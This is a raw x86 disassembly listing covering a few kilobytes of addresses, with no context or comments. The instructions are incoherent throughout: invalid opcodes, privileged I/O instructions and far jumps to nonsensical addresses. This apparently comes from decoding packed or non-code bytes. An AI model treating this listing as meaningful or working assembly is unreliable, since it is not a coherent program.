  409277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409278:	call   DWORD PTR [ebx-0x76e29442]
  40927e:	mov    cl,0x99
  409280:	mov    ebx,esp
  409282:	mov    edx,0xe11ce4ac
  409287:	xlat   BYTE PTR ds:[ebx]
  409288:	jmp    0x409233
  40928a:	(bad)  
  40928b:	push   DWORD PTR [eax-0x2b]
  40928e:	mov    ecx,0x3e001cc2
  409293:	stos   BYTE PTR es:[edi],al
  409294:	xor    al,0x9f
  409296:	retf   0xdc2c
  409299:	mov    esi,DWORD PTR [ecx-0x1548df00]
  40929f:	and    esp,DWORD PTR [eax-0x69]
  4092a2:	push   cs
  4092a3:	inc    eax
  4092a4:	aad    0x25
  4092a6:	mov    dh,0xba
  4092a8:	sub    eax,0x56c646
  4092ad:	mov    WORD PTR [edi+0x3cf05d44],gs
  4092b3:	mov    ebp,0x32260a9a
  4092b8:	or     BYTE PTR ds:0x55e27825,bl
  4092be:	adc    BYTE PTR [ecx+0x16],bh
  4092c1:	xchg   edx,eax
  4092c2:	jae    0x409330
  4092c4:	dec    BYTE PTR [ebp+0x52]
  4092c7:	iret   
  4092c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c9:	aad    0x1b
  4092cb:	add    BYTE PTR [ebx-0x3a],ah
  4092ce:	lods   al,BYTE PTR ds:[esi]
  4092cf:	mov    edx,esp
  4092d1:	sub    DWORD PTR ds:0x21ba8368,esi
  4092d7:	cdq    
  4092d8:	mov    ds:0x506c8945,eax
  4092dd:	mov    bl,BYTE PTR [eax]
  4092df:	adc    cl,BYTE PTR [ebp-0x3ab6d6d8]
  4092e5:	cmp    dl,cl
  4092e7:	cmp    eax,0xc634b6fe
  4092ec:	cmp    al,0xb8
  4092ee:	mov    ebp,0x259c9e56
  4092f3:	mov    ch,0x21
  4092f5:	scas   eax,DWORD PTR es:[edi]
  4092f6:	call   0xe00a:0x20d841dd
  4092fd:	jl     0x4092ca
  4092ff:	(bad)  
  409300:	call   FWORD PTR [esi-0x1318708e]
  409306:	xchg   DWORD PTR ds:0x9575c3e0,edx
  40930c:	(bad)  
  40930d:	or     al,0xb
  40930f:	dec    ecx
  409310:	imul   esp,DWORD PTR [esi],0x3e
  409313:	adc    al,BYTE PTR [esi-0x5a84ef1]
  409319:	call   0x861e0e31
  40931e:	mov    bh,0x98
  409320:	jno    0x4092b2
  409322:	(bad)  [edx-0x3efbe9bd]
  409328:	and    ah,bl
  40932a:	mov    DWORD PTR [edi-0x7c],edx
  40932d:	cmp    eax,0x3f58ca80
  409332:	repz and DWORD PTR [eax],ecx
  409335:	sbb    BYTE PTR [ebp-0x445d6e3a],al
  40933b:	call   0x358714ce
  409340:	nop
  409341:	out    0xec,eax
  409343:	or     al,0x56
  409345:	jno    0x4092e5
  409347:	mov    ebp,0x5269c679
  40934c:	pop    es
  40934d:	sub    al,0x92
  40934f:	dec    edx
  409350:	ss jb  0x409367
  409353:	jno    0x4093c7
  409355:	jae    0x4092f8
  409357:	stc    
  409358:	dec    edx
  409359:	push   esi
  40935a:	xchg   edi,eax
  40935b:	or     eax,0x6ca1a564
  409360:	mov    edx,0xbf99acc
  409365:	sti    
  409366:	nop
  409367:	out    0xc0,al
  409369:	mov    al,ds:0x2747ffd1
  40936e:	mov    al,0x66
  409370:	sbb    al,0x60
  409372:	jno    0x40936c
  409374:	xchg   DWORD PTR [edx+0x31],ebp
  409377:	(bad)  
  409378:	call   0x4cb283bf
  40937d:	mov    edx,0xa29a9cee
  409382:	mov    esi,0xad4d77d2
  409387:	loope  0x409340
  409389:	and    DWORD PTR [eax+0x7fadaf07],ebp
  40938f:	mov    al,ds:0x57f6d6c1
  409394:	jg     0x4093c3
  409396:	es pop edi
  409398:	ja     0x4093a6
  40939a:	pushf  
  40939b:	fs push ecx
  40939d:	rcr    edx,1
  40939f:	jne    0x4093f1
  4093a1:	add    DWORD PTR ds:0xdaf7707a,ebx
  4093a7:	or     bh,BYTE PTR [ebp+0x57a0e2c6]
  4093ad:	and    DWORD PTR [ecx+0x5d],0x3f1b1c65
  4093b4:	mov    dh,0x95
  4093b6:	mov    ds:0xd676429e,eax
  4093bb:	pop    ss
  4093bc:	inc    edi
  4093bd:	inc    ecx
  4093be:	(bad)  
  4093c0:	sbb    ebp,esp
  4093c2:	ins    DWORD PTR es:[edi],dx
  4093c3:	inc    ebp
  4093c4:	jae    0x4093c2
  4093c6:	jo     0x409355
  4093c8:	jle    0x409427
  4093ca:	stos   BYTE PTR es:[edi],al
  4093cb:	and    dl,ah
  4093cd:	pop    es
  4093ce:	mov    eax,0x2c2c7bc0
  4093d3:	xor    eax,0xc9212dd5
  4093d8:	cmp    dh,BYTE PTR [esi+ebx*4-0x70]
  4093dc:	add    edi,DWORD PTR [edx]
  4093de:	jnp    0x409388
  4093e0:	scas   al,BYTE PTR es:[edi]
  4093e1:	jge    0x4093aa
  4093e3:	test   DWORD PTR ds:0x9f7946a6,ecx
  4093e9:	pop    edx
  4093ea:	std    
  4093eb:	sbb    eax,0xccf2fdf3
  4093f0:	cmp    DWORD PTR [ebp-0x3a5805cf],esi
  4093f6:	ret    0xbc5
  4093f9:	push   ebp
  4093fa:	mov    eax,ds:0x524275fd
  4093ff:	shr    DWORD PTR [ecx],0xa1
  409402:	popa   
  409403:	jge    0x409413
  409405:	sahf   
  409406:	bound  edi,QWORD PTR [ecx-0x6b]
  409409:	fwait
  40940a:	lea    esi,ds:0xa0a0d755
  409410:	pop    ds
  409411:	jge    0x409476
  409413:	and    BYTE PTR [ecx],ch
  409415:	inc    ecx
  409416:	sbb    BYTE PTR [ecx-0xad2c626],bl
  40941c:	adc    BYTE PTR [edi+0x20],0xfe
  409420:	mov    eax,0xa2515bbf
  409425:	into   
  409426:	dec    esp
  409427:	out    0x5c,eax
  409429:	inc    edi
  40942a:	sar    DWORD PTR [edx],1
  40942c:	ins    DWORD PTR es:[edi],dx
  40942d:	test   al,0x78
  40942f:	and    esi,DWORD PTR [ebp+esi*8+0x69d002ac]
  409436:	pop    ebp
  409437:	rcl    BYTE PTR [ebx],cl
  409439:	jp     0x40944d
  40943b:	add    al,0x90
  40943d:	es in  al,dx
  40943f:	das    
  409440:	loop   0x4094a0
  409442:	dec    edx
  409443:	mov    esi,0xdddf9cee
  409448:	cdq    
  409449:	mov    gs,edx
  40944b:	fsubr  st,st(1)
  40944d:	jns    0x4094a4
  40944f:	pop    ebx
  409450:	jno    0x4093e2
  409452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409453:	(bad)  
  409454:	mov    ah,0xb2
  409456:	mov    ?,ebp
  409458:	sbb    cl,bl
  40945a:	jne    0x40943a
  40945c:	es add eax,0xe212d88b
  409462:	dec    ecx
  409463:	sub    ecx,DWORD PTR [edi+0x39115711]
  409469:	rcl    BYTE PTR [esi-0x17],1
  40946c:	and    al,0x72
  40946e:	xchg   esi,eax
  40946f:	mov    esp,?
  409471:	cmp    dh,BYTE PTR [edi-0x52]
  409474:	mov    WORD PTR [eax],ds
  409476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409477:	mov    esp,0x33e751ea
  40947c:	or     al,0x9c
  40947e:	and    edx,ebx
  409480:	stos   BYTE PTR es:[edi],al
  409481:	ss mov bl,0xbb
  409484:	aas    
  409485:	sbb    al,0x75
  409487:	(bad)  
  409488:	es mov esp,0x4bf001be
  40948e:	fwait
  40948f:	sbb    eax,0xfd5f10
  409494:	ja     0x4094a4
  409496:	or     al,0x4a
  409498:	loopne 0x409474
  40949a:	mov    edi,0x64ba6dfc
  40949f:	jg     0x4094d7
  4094a1:	or     al,0xe2
  4094a3:	enter  0x560e,0x79
  4094a7:	lds    edi,FWORD PTR [ecx+0x2d93b43d]
  4094ad:	inc    ebp
  4094ae:	or     bl,BYTE PTR [ebp+0x45]
  4094b1:	xor    bl,bl
  4094b3:	pop    edi
  4094b4:	fiadd  DWORD PTR [esi-0x5c263e7a]
  4094ba:	mov    bl,0x28
  4094bc:	dec    ebp
  4094bd:	add    ch,bl
  4094bf:	mov    cl,0xfa
  4094c1:	jns    0x4094fb
  4094c3:	add    bl,dl
  4094c5:	ins    BYTE PTR es:[edi],dx
  4094c6:	cwde   
  4094c7:	xchg   esp,eax
  4094c8:	out    0x1e,al
  4094ca:	iret   
  4094cb:	adc    BYTE PTR [ecx+0x7b97ec4a],0x4a
  4094d2:	push   ecx
  4094d3:	mov    dl,BYTE PTR [edi]
  4094d5:	xlat   BYTE PTR ds:[ebx]
  4094d6:	stos   BYTE PTR es:[edi],al
  4094d7:	dec    BYTE PTR ds:0x431b33fe
  4094dd:	jecxz  0x4094d9
  4094df:	and    edx,DWORD PTR [eax+0x1c]
  4094e2:	scas   al,BYTE PTR es:[edi]
  4094e3:	mov    eax,0xd7a7e3be
  4094e8:	and    DWORD PTR [ebx-0x5bd48ccb],eax
  4094ee:	mov    esp,0x17d6ba4d
  4094f3:	das    
  4094f4:	jo     0x409534
  4094f6:	(bad)  
  4094f7:	lods   eax,DWORD PTR ds:[esi]
  4094f8:	mov    eax,ds:0xe4973204
  4094fd:	outs   dx,BYTE PTR ds:[esi]
  4094fe:	dec    eax
  4094ff:	pop    ecx
  409500:	sub    dl,cl
  409502:	sbb    ch,BYTE PTR [ebx-0x196eee4d]
  409508:	xor    DWORD PTR [ebx-0x1db37b14],0x5d
  40950f:	xor    BYTE PTR ds:0x43f75fec,0x8c
  409516:	arpl   ax,di
  409518:	cmc    
  409519:	and    eax,0xf5c9985c
  40951e:	es push esi
  409520:	add    BYTE PTR ds:0x73bfdd59,bl
  409526:	cwde   
  409527:	js     0x409506
  409529:	mov    al,0xa2
  40952b:	fdivr  DWORD PTR [edx-0x68]
  40952e:	push   ebx
  40952f:	jmp    0x624fe05
  409534:	dec    esp
  409535:	rcl    BYTE PTR [ecx+0x29],cl
  409538:	jns    0x4095b0
  40953a:	gs push cs
  40953c:	pop    es
  40953d:	stos   DWORD PTR es:[edi],eax
  40953e:	in     eax,dx
  40953f:	int    0x29
  409541:	mov    ebp,DWORD PTR [eax]
  409543:	loop   0x4094db
  409545:	mov    al,BYTE PTR [eax]
  409547:	shl    BYTE PTR [esi+0x27],1
  40954a:	ret    
  40954b:	ror    BYTE PTR [edx-0x8],cl
  40954e:	mov    al,dl
  409550:	pop    ecx
  409551:	fld    DWORD PTR ds:0xfa92dca2
  409557:	ret    0xf4ba
  40955a:	out    dx,eax
  40955b:	cmp    cl,ah
  40955d:	adc    DWORD PTR [edi-0x3e4fa4b1],ecx
  409563:	push   ecx
  409564:	adc    al,0x24
  409566:	xchg   edx,eax
  409567:	loopne 0x409593
  409569:	fistp  WORD PTR [edi]
  40956b:	dec    edx
  40956c:	cdq    
  40956d:	push   esi
  40956e:	daa    
  40956f:	loope  0x4095bf
  409571:	mov    eax,ds:0x51fe549f
  409576:	outs   dx,BYTE PTR ds:[esi]
  409577:	pop    esp
  409578:	addr16 into 
  40957a:	pop    ds
  40957b:	stos   DWORD PTR es:[edi],eax
  40957c:	adc    eax,ecx
  40957e:	mov    bl,0x5c
  409580:	lea    ebx,[edi+0x4e]
  409583:	jmp    0xa6f8:0xfc076867
  40958a:	sahf   
  40958b:	mov    ds:0x8d3bf0f,al
  409590:	ret    
  409591:	mov    bh,0xf8
  409593:	xchg   edx,eax
  409594:	cdq    
  409595:	inc    ebp
  409596:	int    0xe6
  409598:	lds    eax,FWORD PTR [ebx+edi*2-0x225bc6db]
  40959f:	push   ds
  4095a0:	adc    ah,dh
  4095a2:	sbb    eax,0xf6bb0047
  4095a7:	mov    ebx,0x80c9e3b9
  4095ac:	(bad)  
  4095ad:	(bad)  
  4095af:	inc    edx
  4095b0:	sub    eax,0x4378f04a
  4095b5:	pop    edi
  4095b6:	mov    esp,0xaafabb0a
  4095bb:	ret    0xdc59
  4095be:	scas   al,BYTE PTR es:[edi]
  4095bf:	jae    0x409603
  4095c1:	or     BYTE PTR [ebp+0x6b],cl
  4095c4:	test   BYTE PTR [eax+eax*8],ch
  4095c7:	in     eax,0x4
  4095c9:	pop    ss
  4095ca:	xchg   esp,esi
  4095cc:	test   eax,0x4c7d7152
  4095d1:	es gs out 0x64,eax
  4095d5:	mov    al,ds:0x8e0ba491
  4095da:	leave  
  4095db:	pop    edi
  4095dc:	xchg   ebp,eax
  4095dd:	pop    edx
  4095de:	pop    ecx
  4095df:	aas    
  4095e0:	or     ch,0xb3
  4095e3:	sub    al,0xce
  4095e5:	inc    esi
  4095e6:	sub    eax,0x5eb05c9f
  4095eb:	adc    al,0x8a
  4095ed:	shl    DWORD PTR [ebx-0x33],1
  4095f0:	adc    DWORD PTR [esi+ebp*4+0x3fb53cdb],0x8d2f1d1d
  4095fb:	inc    eax
  4095fc:	mov    ecx,0x61cdb3ef
  409601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409602:	test   eax,0x9c03d634
  409607:	adc    al,0xc4
  409609:	add    esp,eax
  40960b:	add    eax,0x2493fbef
  409610:	iret   
  409611:	dec    ebx
  409612:	sbb    BYTE PTR [ebp+0x1b4eaf74],cl
  409618:	add    ebx,esp
  40961a:	mov    edi,0x44611367
  40961f:	data16 into 
  409621:	xchg   bh,dh
  409623:	repnz adc ecx,esi
  409626:	icebp  
  409627:	pusha  
  409628:	rcl    BYTE PTR [ebp+0x63],0xa
  40962c:	jbe    0x40969c
  40962e:	pop    esi
  40962f:	sub    al,0x40
  409631:	and    eax,0x2499873e
  409636:	ret    0xc998
  409639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40963a:	dec    edi
  40963b:	int    0xd6
  40963d:	cs icebp 
  40963f:	mov    eax,ds:0xbf068f68
  409644:	stos   BYTE PTR es:[edi],al
  409645:	mov    al,fs:0x4425793
  40964b:	data16 nop/reserved BYTE PTR [ebx]
  40964f:	sub    BYTE PTR [eax+0x7b],0x62
  409653:	enter  0xabbf,0x69
  409657:	mov    dl,BYTE PTR [eax-0x11]
  40965a:	clc    
  40965b:	jmp    0xc12957bf
  409660:	cdq    
  409661:	mov    fs,WORD PTR [esp+ebp*2+0x76]
  409665:	add    edx,ebp
  409667:	mov    ds,WORD PTR [ecx+0x17]
  40966a:	or     ch,BYTE PTR [esi]
  40966c:	sub    al,0xf
  40966e:	xor    eax,0x3d45b15c
  409673:	sub    eax,0x1d25c764
  409678:	pop    es
  409679:	in     al,dx
  40967a:	(bad)  
  40967b:	fcom   DWORD PTR [ebp+0x6e]
  40967e:	xor    eax,0xb6966381
  409683:	adc    ecx,eax
  409685:	mov    edx,0x6e638c4b
  40968a:	mov    dh,0xb9
  40968c:	mov    dl,dl
  40968e:	mov    ah,0xb0
  409690:	outs   dx,DWORD PTR ds:[esi]
  409691:	je     0x4096a6
  409693:	cs and eax,0xeaa8362f
  409699:	xchg   ebx,eax
  40969a:	stc    
  40969b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40969c:	(bad)  
  40969d:	stos   BYTE PTR es:[edi],al
  40969e:	sub    al,0x66
  4096a0:	aad    0xb0
  4096a2:	add    eax,0x1e8c1d51
  4096a7:	jbe    0x409722
  4096a9:	mov    esi,0xe9ae71bc
  4096ae:	imul   edx,DWORD PTR [ebp-0x3ad645ee],0x9013cbf6
  4096b8:	aas    
  4096b9:	add    eax,0x448e8a45
  4096be:	pop    eax
  4096bf:	jb     0xbc33805f
  4096c5:	dec    ebp
  4096c6:	jmp    DWORD PTR [ecx-0x3cf30911]
  4096cc:	stos   DWORD PTR es:[edi],eax
  4096cd:	mov    al,0x9
  4096cf:	and    DWORD PTR [ebx+0x3782b5ec],eax
  4096d5:	mov    ds:0xfb638987,al
  4096da:	mov    ecx,0x30fd3c6e
  4096df:	int3   
  4096e0:	mov    ds:0x81ae6b9,eax
  4096e5:	into   
  4096e6:	add    BYTE PTR [ecx],al
  4096e8:	or     BYTE PTR [edx],ch
  4096ea:	sti    
  4096eb:	dec    esp
  4096ec:	xchg   esp,eax
  4096ed:	adc    DWORD PTR [esi+0x71],ecx
  4096f0:	jns    0x40972d
  4096f2:	or     DWORD PTR [ebx+edi*8-0x29],esi
  4096f6:	mov    ss,WORD PTR [ebx]
  4096f8:	jae    0x4096e1
  4096fa:	out    dx,al
  4096fb:	ss pushf 
  4096fd:	and    ebx,DWORD PTR [eax+0x1a0754c6]
  409703:	ins    DWORD PTR es:[edi],dx
  409704:	xor    BYTE PTR [edx],al
  409706:	shr    bh,cl
  409708:	push   edi
  409709:	stos   DWORD PTR es:[edi],eax
  40970a:	cwde   
  40970b:	in     al,0x30
  40970d:	sbb    bl,BYTE PTR [ebp-0x4750429f]
  409713:	and    DWORD PTR [edi+0x36],esi
  409716:	lods   al,BYTE PTR ds:[esi]
  409717:	js     0x4096b0
  409719:	xor    BYTE PTR [edi+0x6fd5bf6c],dl
  40971f:	or     ebx,DWORD PTR [edx+ecx*1-0x6d]
  409723:	aam    0x5e
  409725:	sbb    ah,BYTE PTR [edx-0x62af64a9]
  40972b:	push   edi
  40972c:	dec    esp
  40972d:	lds    edi,FWORD PTR [edi+0x2f]
  409730:	icebp  
  409731:	test   BYTE PTR ds:0xe036cca4,ch
  409737:	sub    edx,DWORD PTR [eax+0x39d63a39]
  40973d:	inc    esi
  40973e:	loopne 0x409756
  409740:	fnstsw WORD PTR [edx-0x5908ae06]
  409746:	inc    esp
  409747:	inc    ebx
  409748:	push   eax
  409749:	stc    
  40974a:	xor    DWORD PTR [esi],edi
  40974c:	sbb    bh,BYTE PTR [edx]
  40974e:	sbb    DWORD PTR [ecx+0xc27d00b],esp
  409754:	lock sti 
  409756:	dec    ecx
  409757:	or     bh,BYTE PTR [eax]
  409759:	pop    eax
  40975a:	pop    ds
  40975b:	inc    edi
  40975c:	lock pop ebp
  40975e:	rcl    DWORD PTR [eax+0x61],1
  409761:	je     0x409747
  409763:	mov    ah,0xf7
  409765:	test   edi,esi
  409767:	xor    ebx,DWORD PTR [esi+0x5f6b5ad3]
  40976d:	pop    edi
  40976e:	sti    
  40976f:	enter  0x1849,0x43
  409773:	xchg   esp,eax
  409774:	cmp    DWORD PTR [edx+0x7f0ea5f5],ebp
  40977a:	nop
  40977b:	out    0xbe,al
  40977d:	inc    eax
  40977e:	push   eax
  40977f:	cmc    
  409780:	dec    edi
  409781:	in     eax,dx
  409782:	push   eax
  409783:	int3   
  409784:	add    ecx,DWORD PTR [ebx]
  409786:	ret    
  409787:	push   esi
  409788:	in     al,dx
  409789:	mov    dh,dl
  40978b:	xor    DWORD PTR [esi-0x11143a67],edi
  409791:	xor    eax,0x57dc9572
  409796:	mov    al,ds:0xe8de5d7
  40979b:	mov    dl,0x51
  40979d:	jge    0x409780
  40979f:	xchg   ecx,eax
  4097a0:	or     dh,BYTE PTR [eax]
  4097a2:	aad    0xca
  4097a4:	dec    ebx
  4097a5:	sbb    edi,DWORD PTR [esi]
  4097a7:	(bad)  
  4097a8:	hlt    
  4097a9:	jne    0x4097c1
  4097ab:	push   0xe3b4e1ed
  4097b0:	bnd jmp 0x40980a
  4097b3:	mov    ah,0xa0
  4097b5:	lds    ebp,FWORD PTR [ebp-0xa]
  4097b8:	pop    ebx
  4097b9:	lock xor eax,0xa5baf6f
  4097bf:	fcom   QWORD PTR [esi+0x18d27801]
  4097c5:	inc    ebx
  4097c6:	inc    ebp
  4097c7:	imul   esp,DWORD PTR [edi+0x377f3409],0x2b
  4097ce:	sbb    eax,0xc41efc12
  4097d3:	and    eax,0x2ea1f729
  4097d8:	jbe    0x40983e
  4097da:	xor    cl,BYTE PTR [ebp-0x516c228a]
  4097e0:	pop    ss
  4097e1:	xchg   dh,cl
  4097e3:	jnp    0x40984c
  4097e5:	xchg   ebx,eax
  4097e6:	push   eax
  4097e7:	add    eax,DWORD PTR [edi-0x4d]
  4097ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097eb:	lahf   
  4097ec:	sahf   
  4097ed:	push   edx
  4097ee:	(bad)  
  4097ef:	dec    BYTE PTR [eax+0x9961f47]
  4097f5:	xchg   esp,eax
  4097f6:	aaa    
  4097f7:	aas    
  4097f8:	repz fild WORD PTR [esi]
  4097fb:	push   esp
  4097fc:	hlt    
  4097fd:	mov    al,0xcf
  4097ff:	rcl    BYTE PTR [ebp-0x63],cl
  409802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409803:	ss pushf 
  409805:	jmp    0xb6ee:0x110d841a
  40980c:	(bad)  
  40980d:	mov    ecx,0xbc370629
  409812:	mov    al,0xbc
  409814:	in     al,0xb2
  409816:	jno    0x409826
  409818:	or     BYTE PTR [edi-0x76],bl
  40981b:	repnz adc eax,0x5e52ceea
  409821:	cmp    ah,dh
  409823:	push   ss
  409824:	out    dx,al
  409825:	sar    BYTE PTR [esi],1
  409827:	xchg   ebx,eax
  409828:	xor    eax,0x40eae2ba
  40982d:	jbe    0x4098a4
  40982f:	jmp    0x28b1ec96
  409834:	pop    ds
  409835:	push   edx
  409836:	data16 hlt 
  409838:	mov    edi,0x303b64cf
  40983d:	cdq    
  40983e:	fs imul eax,ebx,0xb7a0777e
  409845:	or     BYTE PTR [esi+0x25],cl
  409848:	cmp    BYTE PTR [eax],dh
  40984a:	and    al,0x45
  40984c:	pop    esp
  40984d:	and    BYTE PTR [ebx],bh
  40984f:	jmp    0xec95:0x34a634b4
  409856:	mov    eax,0xc8d58d67
  40985b:	sub    al,0x8e
  40985d:	ror    BYTE PTR [ebp+eax*8+0x3e],cl
  409861:	pusha  
  409862:	fdivr  DWORD PTR [ebp+ecx*2+0x9538992]
  409869:	mov    dh,0x2f
  40986b:	push   eax
  40986c:	fs or  DWORD PTR ss:[ebp+0x23c2d15e],edi
  409874:	xchg   edi,eax
  409875:	rol    DWORD PTR [ecx],1
  409877:	adc    al,0xda
  409879:	ds mov esi,0x29903ebb
  40987f:	ret    
  409880:	gs mov esi,0x656eec6a
  409886:	dec    eax
  409887:	xor    al,0xc8
  409889:	lea    eax,[ecx-0x50]
  40988c:	jmp    0x6b796db2
  409891:	jecxz  0x409885
  409893:	cli    
  409894:	leave  
  409895:	mov    eax,ds:0x5708c091
  40989a:	dec    ecx
  40989b:	stc    
  40989c:	push   0xffffff90
  40989e:	jmp    DWORD PTR [esi-0x25]
  4098a1:	inc    edx
  4098a2:	jno    0x409915
  4098a4:	jmp    0xdeff:0xb66217fe
  4098ab:	pop    ss
  4098ac:	out    dx,al
  4098ad:	mov    bl,0x74
  4098af:	jle    0x4098c3
  4098b1:	aas    
  4098b2:	das    
  4098b3:	lea    ebp,[eax]
  4098b5:	nop
  4098b6:	ror    BYTE PTR [edx-0xd7db87e],1
  4098bc:	jge    0x409840
  4098be:	jl     0x40985e
  4098c0:	dec    ebx
  4098c1:	in     eax,dx
  4098c2:	cwde   
  4098c3:	mov    edx,0xb5275af5
  4098c8:	popa   
  4098c9:	shr    edx,0x8c
  4098cc:	cmp    BYTE PTR [ebp-0x4ba0e7a6],0xee
  4098d3:	into   
  4098d4:	and    DWORD PTR [edx-0x48b2a940],0xffffff81
  4098db:	in     eax,dx
  4098dc:	stos   DWORD PTR es:[edi],eax
  4098dd:	pop    edi
  4098de:	or     edx,ebx
  4098e0:	push   esp
  4098e1:	xchg   BYTE PTR [edx-0x66],al
  4098e4:	add    ch,ch
  4098e6:	push   ebp
  4098e7:	inc    edi
  4098e8:	fisub  DWORD PTR [esp+eax*4+0x7c2d9d1c]
  4098ef:	mov    ebx,0x147c0eed
  4098f4:	imul   esi,ebp,0x73958ace
  4098fa:	frstor [ecx]
  4098fc:	push   ebp
  4098fd:	lock mov ds:0x8488daf2,eax
  409903:	xlat   BYTE PTR ds:[ebx]
  409904:	popa   
  409905:	inc    ebp
  409906:	add    dh,BYTE PTR [eax+edi*8-0x7d]
  40990a:	sbb    cl,BYTE PTR [edi-0x20]
  40990d:	ret    
  40990e:	ins    DWORD PTR es:[edi],dx
  40990f:	shl    DWORD PTR [edx],0x40
  409912:	mov    edx,0xb6e18d06
  409917:	ja     0x4098c4
  409919:	popf   
  40991a:	je     0x4098b5
  40991c:	repnz adc BYTE PTR fs:[edx+esi*1-0x2ab7bc1f],ch
  409925:	mov    esi,0xcc79d0bf
  40992a:	fmulp  st(5),st
  40992c:	mov    ds:0xdc491cb1,eax
  409931:	or     cl,BYTE PTR [edx+ebp*4+0x32874f88]
  409938:	sahf   
  409939:	adc    eax,0x1272b10c
  40993e:	cs mov edx,0x6a781504
  409944:	mov    edi,0xcc8640ad
  409949:	out    dx,eax
  40994a:	rcl    DWORD PTR ds:0x850e52e6,0x22
  409951:	loope  0x409950
  409953:	repnz aad 0xf0
  409956:	rcl    BYTE PTR [ecx+0x4],0x58
  40995a:	pushf  
  40995b:	jns    0x409955
  40995d:	cmp    esi,esi
  40995f:	test   al,0x79
  409961:	adc    eax,0xdb9e4e01
  409966:	out    dx,eax
  409967:	mov    al,ds:0x3a14f0f6
  40996c:	imul   edi,DWORD PTR [esi+0x96fe1f3],0xf4393dfb
  409976:	ins    BYTE PTR es:[edi],dx
  409977:	(bad)  
  409978:	jg     0x40997a
  40997a:	jne    0x409937
  40997c:	fld    DWORD PTR [edx-0x2e]
  40997f:	mov    dh,0x84
  409981:	test   BYTE PTR [eax],cl
  409983:	mov    ds:0xa8754b57,eax
  409988:	sub    dl,ch
  40998a:	push   eax
  40998b:	test   BYTE PTR [ebx+0x24],bl
  40998e:	mov    eax,ds:0x310dac05
  409993:	retf   0x61f7
  409996:	scas   eax,DWORD PTR es:[edi]
  409997:	loop   0x4099d1
  409999:	sbb    DWORD PTR [edx],ecx
  40999b:	push   edx
  40999c:	add    al,0x39
  40999e:	push   0xcc5ba3a4
  4099a3:	pop    esp
  4099a4:	lods   al,BYTE PTR ds:[esi]
  4099a5:	scas   al,BYTE PTR es:[edi]
  4099a6:	ret    0xe496
  4099a9:	mov    ah,0xc7
  4099ab:	pop    edx
  4099ac:	in     al,dx
  4099ad:	xchg   edx,eax
  4099ae:	icebp  
  4099af:	xlat   BYTE PTR cs:[ebx]
  4099b1:	out    dx,al
  4099b2:	xlat   BYTE PTR ds:[ebx]
  4099b3:	lods   al,BYTE PTR ds:[esi]
  4099b4:	cdq    
  4099b5:	js     0x409a22
  4099b7:	fnstcw WORD PTR [edi-0x32]
  4099ba:	fstp   st(0)
  4099bc:	pop    edi
  4099bd:	sub    DWORD PTR [edi+0x7c26e248],eax
  4099c3:	les    edx,FWORD PTR [ebp-0x66]
  4099c6:	pushf  
  4099c7:	lahf   
  4099c8:	lahf   
  4099c9:	fisttp WORD PTR [eax+eiz*1-0x564ec653]
  4099d0:	imul   esi,DWORD PTR ds:[ebx-0x7f27b87e],0x1c8e9f5a
  4099db:	(bad)  cs:[ecx+0x45bcba93]
  4099e2:	mov    bl,0xb0
  4099e4:	stos   DWORD PTR es:[edi],eax
  4099e5:	cld    
  4099e6:	sbb    cl,al
  4099e8:	xchg   edx,eax
  4099e9:	and    eax,0x5c9a82e5
  4099ee:	scas   al,BYTE PTR es:[edi]
  4099ef:	stos   DWORD PTR es:[edi],eax
  4099f0:	inc    ebp
  4099f1:	leave  
  4099f2:	sbb    BYTE PTR [eax],ah
  4099f4:	push   es
  4099f5:	mov    al,ds:0x18670dd
  4099fa:	push   ecx
  4099fb:	rcl    DWORD PTR [bp+di-0x61],0x99
  409a00:	cdq    
  409a01:	jns    0x409983
  409a03:	in     eax,0xb3
  409a05:	nop
  409a06:	sbb    BYTE PTR [ecx+0x6df3b60],bl
  409a0c:	dec    edi
  409a0d:	jo     0x409a4e
  409a0f:	stos   DWORD PTR es:[edi],eax
  409a10:	mov    dh,0xb4
  409a12:	mov    fs:0xec2bb3a5,al
  409a18:	imul   ebp,eax,0x4341c284
  409a1e:	jg     0x409a59
  409a20:	pop    es
  409a21:	add    al,0x7f
  409a23:	dec    esp
  409a24:	adc    al,cl
  409a26:	inc    ebx
  409a27:	mov    bl,0xf7
  409a29:	cld    
  409a2a:	iret   
  409a2b:	adc    ebx,esi
  409a2d:	mov    ds:0x14ae264,eax
  409a32:	jmp    0x7501:0xfe522137
  409a39:	sbb    al,0x59
  409a3b:	push   edi
  409a3c:	(bad)  
  409a3d:	clc    
  409a3e:	outs   dx,BYTE PTR ds:[esi]
  409a3f:	cmp    ebx,DWORD PTR [eax-0x52]
  409a42:	mov    ds:0xd90e934d,eax
  409a47:	popf   
  409a48:	sahf   
  409a49:	lds    esi,FWORD PTR [ecx+0x1e]
  409a4c:	inc    eax
  409a4d:	les    ecx,FWORD PTR [eax-0x39ba119]
  409a53:	popf   
  409a54:	xor    BYTE PTR [ebx+0x58],bl
  409a57:	das    
  409a58:	cli    
  409a59:	ror    bh,0xb6
  409a5c:	ss jno 0x409a28
  409a5f:	mov    BYTE PTR [edi+0x52],dl
  409a62:	scas   al,BYTE PTR es:[edi]
  409a63:	ins    DWORD PTR es:[edi],dx
  409a64:	pop    edi
  409a65:	adc    DWORD PTR [edx+eiz*8+0x5243853b],0x45
  409a6d:	outs   dx,DWORD PTR ds:[esi]
  409a6e:	push   ebx
  409a6f:	and    ch,al
  409a71:	loop   0x409a4a
  409a73:	pop    ds
  409a74:	jge    0x409a34
  409a76:	aas    
  409a77:	inc    edi
  409a78:	xor    al,0xbc
  409a7a:	inc    esp
  409a7b:	loope  0x409aab
  409a7d:	xchg   DWORD PTR [edi+0x2de03f2c],esp
  409a83:	mov    esi,0x4b75d912
  409a88:	cmp    ch,BYTE PTR [ecx+0x6a736e7d]
  409a8e:	pop    ss
  409a8f:	xlat   BYTE PTR ds:[ebx]
  409a90:	retf   0x3cc8
  409a93:	fldenv [edx]
  409a95:	test   DWORD PTR [ebx+0x65],esi
  409a98:	inc    esp
  409a99:	js     0x409aa0
